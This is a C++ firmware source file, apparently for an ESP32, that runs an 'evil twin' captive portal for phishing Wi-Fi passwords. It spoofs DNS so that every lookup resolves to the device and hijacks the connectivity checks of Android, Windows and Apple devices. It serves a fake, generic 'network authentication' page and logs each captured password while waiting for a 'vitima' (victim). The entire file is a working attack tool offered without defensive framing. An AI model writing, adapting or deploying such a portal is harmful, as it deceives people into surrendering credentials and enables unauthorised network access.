#include "wifi_portal.h"
#include "config.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

static WebServer server(80);
static DNSServer dnsServer;
static bool portalActive = false;
static char portalPassword[64] = {0};
static const char* portalStatusMsg = "Aguardando...";

// HTML da pagina de login - generica, responsiva
static const char* portalHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Autenticação WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px;width:100%;max-width:360px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}
.icon{width:64px;height:64px;background:#667eea;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:bold}
h1{font-size:20px;color:#333;margin-bottom:8px}
p.desc{color:#666;font-size:14px;margin-bottom:24px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;margin-bottom:16px;transition:border-color 0.2s}
input:focus{outline:none;border-color:#667eea}
button{width:100%;padding:14px;background:#667eea;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s}
button:hover{background:#5a6fd6}
.footer{margin-top:20px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="card">
<div class="icon">WiFi</div>
<h1>Conectar à rede</h1>
<p class="desc">Esta rede requer autenticação adicional para acesso à internet.</p>
<form action="/post" method="POST" onsubmit="this.querySelector('button').textContent='Conectando...';this.querySelector('button').disabled=true;">
<input type="password" name="pass" placeholder="Senha da rede" required autocomplete="off">
<button type="submit">Conectar</button>
</form>
<div class="footer">© 2026 Provedor de Rede</div>
</div>
</body>
</html>
)rawliteral";

static const char* successHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Conectado</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(135deg,#11998e 0%,#38ef7d 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px;width:100%;max-width:360px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}
.icon{width:64px;height:64px;background:#11998e;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px}
h1{font-size:20px;color:#333;margin-bottom:8px}
p{color:#666;font-size:14px}
</style>
</head>
<body>
<div class="card">
<div class="icon">✓</div>
<h1>Conectado com sucesso!</h1>
<p>Aguarde enquanto verificamos sua conexão...</p>
</div>
</body>
</html>
)rawliteral";

static void handleRoot() {
    server.send(200, "text/html", portalHTML);
}

static void handlePost() {
    if (server.hasArg("pass")) {
        String pass = server.arg("pass");
        if (pass.length() > 0) {
            strncpy(portalPassword, pass.c_str(), 63);
            portalPassword[63] = '\0';
            passwordCaptured = true;
            strncpy(capturedPassword, portalPassword, 63);
            capturedPassword[63] = '\0';
            portalStatusMsg = "SENHA CAPTURADA!";
            Serial.printf("[Portal] PASSWORD CAPTURED: %s\n", capturedPassword);
        }
        server.send(200, "text/html", successHTML);
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

static void handleCaptive() {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

static void handleNotFound() {
    // Se nao for nosso IP, redireciona (captive portal detection)
    if (server.hostHeader() != "192.168.4.1") {
        handleCaptive();
        return;
    }
    server.send(404, "text/plain", "Not Found");
}

void startPortal(const char* ssid) {
    if (portalActive) stopPortal();

    portalActive = true;
    portalPassword[0] = '\0';
    portalStatusMsg = "Aguardando vitima...";
    passwordCaptured = false;

    // Inicia DNS server - responde tudo com 192.168.4.1
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    // Configura handlers do web server
    server.on("/", handleRoot);
    server.on("/post", HTTP_POST, handlePost);

    // Captive portal detection endpoints
    server.on("/generate_204", handleCaptive);           // Android
    server.on("/gen_204", handleCaptive);                // Android alternativo
    server.on("/fwlink", handleCaptive);                 // Windows
    server.on("/hotspot-detect.html", handleCaptive);    // Apple
    server.on("/library/test/success.html", handleCaptive); // Apple alternativo
    server.on("/connecttest.txt", handleCaptive);        // Windows NCSI
    server.on("/redirect", handleCaptive);               // Generico
    server.on("/login", handleCaptive);                  // Generico
    server.on("/auth", handleCaptive);                   // Generico

    server.onNotFound(handleNotFound);
    server.begin();

    Serial.printf("[Portal] Started on 192.168.4.1 for SSID: %s\n", ssid);
}

void stopPortal() {
    if (!portalActive) return;
    portalActive = false;
    server.stop();
    dnsServer.stop();
    Serial.println("[Portal] Stopped");
}

void portalLoop() {
    if (!portalActive) return;
    dnsServer.processNextRequest();
    server.handleClient();
}

bool isPortalActive() { return portalActive; }
const char* getCapturedPassword() { return portalPassword; }
const char* getPortalStatus() { return portalStatusMsg; }
